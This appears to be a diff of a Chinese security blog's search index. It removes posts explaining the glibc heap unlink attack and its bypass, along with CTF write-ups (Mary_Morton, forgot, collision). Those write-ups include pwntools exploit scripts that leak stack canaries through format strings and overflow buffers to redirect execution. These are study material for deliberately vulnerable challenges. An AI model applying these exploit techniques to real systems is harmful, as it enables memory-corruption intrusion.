-<h3 id="向前合并"><a href="#向前合并" class="headerlink" title="向前合并"></a>向前合并</h3><p>首先判断下个 chunk 是否空闲，即检查下下个 chunk（相对当前 chunk）的 PREV_INUSE（P）位是否为 0，若为 0 表明下个 chunk 是空闲的，则进行合并。合并时使用 unlink 宏将下个 chunk 从它的 bin 中移除，并更新合并后的 chunk 大小。</p>
-<p>malloc.c 中向前合并的代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)\</span></span><br><span class="line"> (((mchunkptr)(((<span class="keyword">char</span>*)(p)) + (s)))-&gt;size &amp; PREV_INUSE)</span><br><span class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></span><br><span class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></span><br><span class="line">sz = hd &amp; ~PREV_INUSE;</span><br><span class="line">next = chunk_at_offset(p, sz);</span><br><span class="line">nextsz = chunksize(next);</span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!(inuse_bit_at_offset(next, nextsz)))   </span><br><span class="line">&#123;</span><br><span class="line">  sz += nextsz;</span><br><span class="line">  ...</span><br><span class="line">  unlink(next, bck, fwd);</span><br><span class="line">  next = chunk_at_offset(p, sz);</span><br><span class="line">&#125;</span><br><span class="line">set_head(p, sz | PREV_INUSE);</span><br><span class="line">next-&gt;prev_size = sz;</span><br></pre></td></tr></table></figure>
-
-<p>本例中，释放1st chunk 时，当前 chunk 的下一个 chunk（2nd chunk）是 allocated，所以不能向前合并，unlink 宏不会被调用。</p>
-<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>当前释放的堆与前一个或后一个空闲 chunk 进行合并时，会把空闲 chunk 从 bin 中移除，移除过程使用 unlink 宏来实现。unlink 宏的定义如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;  \</span></span><br><span class="line">  FD = P-&gt;fd;             \</span><br><span class="line">  BK = P-&gt;bk;             \</span><br><span class="line">  FD-&gt;bk = BK;            \</span><br><span class="line">  BK-&gt;fd = FD;            \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>unlink 即为将 P 从链表中删除的过程。</p>
-<h2 id="unlink攻击"><a href="#unlink攻击" class="headerlink" title="unlink攻击"></a>unlink攻击</h2><p>在 dlmalloc 中，unlink 的定义如上一节所示，只有与指针操作相关的 4 条语句。但在较新版本的 glibc 中，为了缓解攻击者进行 unlink 攻击，在宏定义中加入了安全校验，使得利用难度加大，只能在特定条件下使用一些技巧绕过校验。</p>
-<h3 id="原始的-unlink-攻击"><a href="#原始的-unlink-攻击" class="headerlink" title="原始的 unlink 攻击"></a>原始的 unlink 攻击</h3><p>述例子中，传入的字符串参数长度大于 666 字节时 strcpy 会使 first chunk 溢出，可覆盖 second chunk 的头部字段为如下值：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prev_size = 偶数</span><br><span class="line">size = <span class="number">-4</span></span><br><span class="line">fd = <span class="built_in">free</span>@got - <span class="number">12</span></span><br><span class="line">bk = shellcode address</span><br></pre></td></tr></table></figure>
-
-<p>在执行 free(first) 时，当前释放的 frist chunk 的下下个 chunk 不是 top chunk。因为 second chunk 的大小覆盖为 -4，所以下下个 chunk 在 second chunk 偏移为 -4 的位置，因此 malloc 把 second chunk 的 prev_size 当做下下个 chunk 的 size。而 prev_size 已被覆盖为偶数（PREV_INUSE位为0），malloc 会将 second chunk 当作空闲 chunk。</p>
-<p>释放 first chunk 时会将 second chunk 从 bin 中 unlink，并将其合并到 first chunk。这个过程会触发 unlink（second），此时 <code>P = second chunk ptr</code>，unlink 过程如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>）FD = second chunk ptr-&gt;fd = <span class="built_in">free</span>@got – <span class="number">12</span></span><br><span class="line"><span class="number">2</span>）BK = second chunk ptr-&gt;bk = shellcode address</span><br><span class="line"><span class="number">3</span>）FD-&gt;bk = BK，即 *((<span class="built_in">free</span>@got–<span class="number">12</span>)-&gt;bk) = shellcode address</span><br><span class="line"><span class="number">4</span>）BK-&gt;fd = FD，即 *(shellcode address-&gt;fd) = <span class="built_in">free</span>@got – <span class="number">12</span></span><br></pre></td></tr></table></figure>
-
-<p>unlink 步骤 1）和 2）将 second chunk 的 fd 和 bk 复制到 FD 和 BK。如下图所示，复制后 <code>FD = free@got-12</code>，<code>BK = shellcode address</code>，即 second chunk 的 fd、bk 指针分别指向 <code>free@got-12</code> 和 <code>shellcode address</code>。</p>
-<p>步骤 3）中 FD 是 malloc_chunk 结构体指针，FD-&gt;bk 相当于 <code>FD+12 = free@got-12+12 = free@got</code>，即 FD-&gt;bk 指向 free 的 GOT 表项，FD-&gt;bk = BK 相当于 <code>free@got = shellcode address</code>，即 free 的 GOT 表项被修改为了 shellcode 地址。因此，程序在执行第二个 free 时就会执行 shellcode。</p>
-<p>同理，步骤4）中将 <code>shellcode addr + 8</code> 处 4 个字节覆盖为 <code>free@got - 12</code>，所以在编写 shellcode 时应跳过这 4 个字节。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/24/PWN/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/2.png" class></strong></p>
-<h2 id="对抗技术"><a href="#对抗技术" class="headerlink" title="对抗技术"></a>对抗技术</h2><h3 id="Double-Free检测"><a href="#Double-Free检测" class="headerlink" title="Double Free检测"></a>Double Free检测</h3><p>该机制不允许释放一个已经处于free状态的chunk。因此，当攻击者将second chunk的size设置为-4的时候，就意味着该size的PREV_INUSE位为0，也就是说second chunk之前的first chunk(我们需要free的chunk)已经处于free状态，那么这时候再free(first)的话，就会报出double free错误。相关代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used. */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="next-size非法检测"><a href="#next-size非法检测" class="headerlink" title="next size非法检测"></a>next size非法检测</h3><p>该机制检测next size是否在8到当前arena的整个系统内存大小之间。因此当检测到next size为-4的时候，就会报出invalid next size错误。相关代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">             || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))&#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="双链表冲突检测"><a href="#双链表冲突检测" class="headerlink" title="双链表冲突检测"></a>双链表冲突检测</h3><p>该机制会在执行unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要unlink的chunk。这样攻击者就无法替换second chunk的fd与fd了。相关代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))             \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P);      \</span><br></pre></td></tr></table></figure>
-
-<p>但记住，即使由上述三种检测方式并不意味着unlink技术都会失效，攻防是一个此消彼长的过程，例如下面介绍一种绕过安全检验的方法（注意具体情况具体分析）。</p>
-<h2 id="绕过安全校验"><a href="#绕过安全校验" class="headerlink" title="绕过安全校验"></a>绕过安全校验</h2><p>首先，需要了解 glibc 中 unlink 的校验机制。以下为 glibc-2.19 中 unlink 宏的部分代码，在删除 P 节点之前会检查 <code>FD-&gt;bk != P || BK-&gt;fd != P</code> 是否成立，即检查当前 chunk 前一个 chunk 的 bk 与后一个 chunk 的 fd 是否指向当前 chunk。若当前 chunk 的 fd 和 bk 被修改则无法通过这项检查，<code>FD-&gt;bk = BK</code> 与 <code>BK-&gt;fd = FD</code> 不会执行，导致 unlink 攻击不能进行。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;         \</span></span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P);      \</span><br><span class="line">    <span class="keyword">else</span> &#123;								          \</span><br><span class="line">        FD-&gt;bk = BK;						    \</span><br><span class="line">        BK-&gt;fd = FD;						    \</span><br><span class="line">        ...</span><br><span class="line">    &#125;									              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>为了绕过以上指针校验，需要以下条件：</p>
-<blockquote>
-<p>a） 程序中存在一个全局指针变量 ptr<br>         b） ptr 指向的堆内存可由用户控制</p>
-</blockquote>
-<p>若具备以上条件，攻击者可在指针 ptr 指向的内存中伪造一个空闲 chunk P，根据 ptr 构造合适的地址覆盖 chunk P 的 fd 和 bk，使得 <code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code> 成立。具体如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd = ptr - <span class="number">0xC</span></span><br><span class="line">P-&gt;bk = ptr - <span class="number">0x8</span></span><br></pre></td></tr></table></figure>
-
-<p>在执行 unlink（P）时的指针操作如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>）FD = P-&gt;fd = ptr - <span class="number">0xC</span>;</span><br><span class="line"><span class="number">2</span>）BK = P-&gt;bk = ptr - <span class="number">0x8</span>;</span><br><span class="line"><span class="comment">// FD-&gt;bk = ptr - 0xC + 0xC = ptr; BK-&gt;fd = ptr -0x8 + 0x8 = ptr</span></span><br><span class="line"><span class="comment">// 由于 ptr 指向 P,可成功绕过指针校验</span></span><br><span class="line"><span class="number">3</span>）FD-&gt;bk = BK，即 *ptr = ptr - <span class="number">0x8</span>;</span><br><span class="line"><span class="number">4</span>）BK-&gt;fd = FD，即 *ptr = ptr - <span class="number">0xC</span>。</span><br></pre></td></tr></table></figure>
-
-<p>由以上过程可知，借助指向 chunk P 的 ptr 指针可绕过 “corrupted double-linked list” 安全机制，并通过 unlink 攻击实现写内存，最终使得 ptr 指向 ptr - 0xc。</p>
-<p>unlink 后，对 ptr 指向的内存进行写入，如 <code>‘A’*0xC + free@got</code>，使得 ptr 指向 free@got，再次对 ptr 指向的内存进行写入，可以把 free@got 修改为 system 的地址，之后调用 free 可任意命令执行。</p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Heap</category>
-        <category>Heap_Attack</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mary_Morton</title>
-    <url>/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/0.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/4.png" class></strong></p>
-<h3 id="检查文件保护措施"><a href="#检查文件保护措施" class="headerlink" title="检查文件保护措施"></a>检查文件保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/1.png" class></strong></p>
-<p>开启了Canary机制，并且设置了不可执行栈。</p>
-<h3 id="查找可疑的字符串"><a href="#查找可疑的字符串" class="headerlink" title="查找可疑的字符串"></a>查找可疑的字符串</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/2.png" class></strong></p>
-<p>其函数的地址为：0x4008DA</p>
-<h3 id="函数执行逻辑"><a href="#函数执行逻辑" class="headerlink" title="函数执行逻辑"></a>函数执行逻辑</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_4009FF();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the battle ! &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[Great Fairy] level pwned &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Select your weapon &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4009DA();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_4008EB();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye &quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      sub_400960();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4009DA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Stack Bufferoverflow Bug &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Format String Bug &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;3. Exit the battle &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化字符串漏洞</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_4008EB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓冲区溢出漏洞</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400960</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-&gt; %s\n&quot;</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>输入v3=1，跳转到缓冲区溢出漏洞，如果不存在canary保护机制，则可以直接覆盖返回地址跳转到system函数。</p>
-<p>输入v3=2，跳转到格式化字符串漏洞，可以打印出栈上Canary，之后利用缓冲区溢出覆盖即可。</p>
-<p>输入v3=3，退出程序</p>
-<h3 id="绕过Canary机制"><a href="#绕过Canary机制" class="headerlink" title="绕过Canary机制"></a>绕过Canary机制</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/3.png" class></strong></p>
-<p>看一下流程图和汇编可以知道readsqword这个地方有canary保护，只有 rax 和fs：28h 两个值相等的时候  才能跳转到返回值，反之则调用stack_chk_fail。</p>
-<p>根据程序可以看出，v2应该就是canary的值，一开始，将_readfsqword(0x28u)的值给v2，后来又和v2做异或操作，只有v2与它还相等，程序返回0，否则返回不为零的数。</p>
-<h3 id="泄露v2（Canary）的值"><a href="#泄露v2（Canary）的值" class="headerlink" title="泄露v2（Canary）的值"></a>泄露v2（Canary）的值</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/6.png" class></strong></p>
-<p>程序中<a href="https://xz.aliyun.com/t/7398">格式化字符串漏洞</a>为</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);  </span><br><span class="line"><span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br></pre></td></tr></table></figure>
-
-<p>程序将输入的<code>AAAA</code>存入buf中，之后格式化字符串打印出了其对应的ASCII码，因此可以计算出格式化字符串中<code>&amp;buf</code>的偏移量，即<code>&amp;buf</code>在第6个参数的位置。</p>
-<p>根据IDA的注释，我们知道buf在<code>rbp-90h</code>，v2在<code>rbp-8h</code>，canary与我们输入参数的偏移为<code>0x90 - 0x8 = 0x88</code>，然后八个字节为一组，<code>0x88 / 8 = 17</code>，因此Canary即v2在格式化字符串的第<code>17 + 6 = 23</code>参数的位置。</p>
-<blockquote>
-<p>基本的格式化字符串参数</p>
-<p>%c：输出字符，配上%n可用于向指定地址写数据。</p>
-<p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p>
-<p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p>
-<p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p>
-<p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
-<p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%​$hn或%$hhn来适时调整。</p>
-<p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p>
-</blockquote>
-<p>注意%p、%x会直接打印栈上存储的值，而%s会打印栈上存储值所指向地址的值。</p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><p>payload的构造：覆盖返回地址，需要0x90-0x8=0x88覆盖局部变量，然后放上canary的值，在填充8个“a”覆盖ebp（64位程序），最后加上system的返回地址。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">49747</span>)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. Exit the battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.sendline(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">print(canary)</span><br><span class="line"> </span><br><span class="line">flag_addr = <span class="number">0x4008da</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">b&#x27;deafbeef&#x27;</span> + p64(flag_addr)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. Exit the battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/5.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>AD_World</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-        <tag>Stack</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>forgot</title>
-    <url>/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/0.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/6.png" class></strong></p>
-<h3 id="检查文件开启的保护措施"><a href="#检查文件开启的保护措施" class="headerlink" title="检查文件开启的保护措施"></a>检查文件开启的保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/1.png" class></strong></p>
-<h3 id="用IDA32打开"><a href="#用IDA32打开" class="headerlink" title="用IDA32打开"></a>用IDA32打开</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/2.png" class></strong></p>
-<p>**__isoc99_scanf()**函数存在栈溢出漏洞，不会检查输入的字符串的长度，第二个参数表明写入地址为v2的地址，因此可以利用从v2地址开始写入内容覆盖控制函数执行流。</p>
-<h3 id="shift-F12查看字符串"><a href="#shift-F12查看字符串" class="headerlink" title="shift+F12查看字符串"></a>shift+F12查看字符串</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/3.png" class></strong></p>
-<p>找到其调用函数的位置</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/4.png" class></strong></p>
-<p>查看sub_80486CC函数所在地址（这里函数名称就对应其地址）</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/5.png" class></strong></p>
-<p>其函数所在地址0x080486CC，注意这里调用system函数需要传递<strong>cat flag</strong>参数，如果跳转地址直接为system函数的地址，则无法传递相应的参数。</p>
-<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>利用栈溢出漏洞，输入v2，将v3-v12任意一个函数的地址修改为sub_80486CC的地址，之后让控制函数执行调用即可。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/7.png" class></strong></p>
-<p>v2是一个32字节的char数组，v2基地址为ebp-0x74，v3基地址为0x54，相差0x74-0x54=0x20=32byte，正好是32字节的char数组的空间大小。因此，这里选择覆盖v3的地址，原因在于v3在栈中紧贴存在栈溢出漏洞的变量，对程序流程造成的未知影响的可能性最小。之后只需要保证函数结尾调用v3，则需要保证- -v14等于0，即让v14等于1。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/8.png" class></strong></p>
-<p>即使得sub_8048702判断条件不成立，直接跳出循环，使得v14的值保持不变，仍为刚开始的1。查看该函数执行的逻辑。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/9.png" class></strong></p>
-<p>查看其ASCII码对应的字符为：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/10.png" class></strong></p>
-<p>若要使得该函数的判断条件不成立，则不能输入字符‘a’-‘z’，’0‘-’9‘，’+‘ ，’-‘，’_’</p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52435</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;xiaohong&#x27;</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x80486CC</span></span><br><span class="line">payload = <span class="string">&#x27;/&#x27;</span>*(<span class="number">0x74</span><span class="number">-0x54</span>)+ p32(cat_flag_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/11.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>AD_World</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-        <tag>Stack</tag>
       </tags>
   </entry>
   <entry>
@@ -540,41 +703,6 @@
       </tags>
   </entry>
   <entry>
-    <title>collision</title>
-    <url>/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/1.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/2.png" class></strong></p>
-<h3 id="查看C语言源代码"><a href="#查看C语言源代码" class="headerlink" title="查看C语言源代码"></a>查看C语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/3.png" class></strong></p>
-<h3 id="main-int-argc-char-argv"><a href="#main-int-argc-char-argv" class="headerlink" title="main(int argc, char* argv[])"></a><a href="https://blog.csdn.net/LYJ_viviani/article/details/51873961">main(int argc, char* argv[])</a></h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/4.png" class></strong></p>
-<p>传递三个参数$aa,bb,cc$, 程序运行结果如下:</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/5.png" class></strong></p>
-<p><strong>注意：若传递n个参数，实际上相当于给main函数传递了n+1个参数，argc=n+1（因为argv[0]是路径名自动传递）</strong></p>
-<h3 id="分析col-c"><a href="#分析col-c" class="headerlink" title="分析col.c"></a>分析col.c</h3><ul>
-<li>函数传递了两个参数，第一个参数为int型，第二个参数为一个字符数组，main函数首先判断第一个参数如果小于2,即若不显式传递参数，则打印argv[0]之后会直接退出。</li>
-<li>argv[1]，即传入的第二个参数，第一个参数为文件所在路径，指向的字符串的长度需要等于20字节。</li>
-<li>check_password函数将指向20字节的字符指针转为int指针，因为int是4字节，即将20字节字符串拆分成为5个int类型的数据，之后求和。</li>
-<li>如果求和的结果和给定的哈希值0x21DD09EC相等，则会执行system函数拿到flag。</li>
-</ul>
-<p>最直接的想法是暴力穷举，寻找哈希碰撞，但实际上这里可以直接凑出这个哈希值，可以令20字节的前16字节都设置为0x01，<strong>注意不能设置为0x00</strong>，因为0x00是一个截断字符，程序读入argv[1]时如果遇到了0x00会自动截断，从而导致程序结果有误。</p>
-<p>另外，注意数据按照小端序存放：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/6.png" class></strong></p>
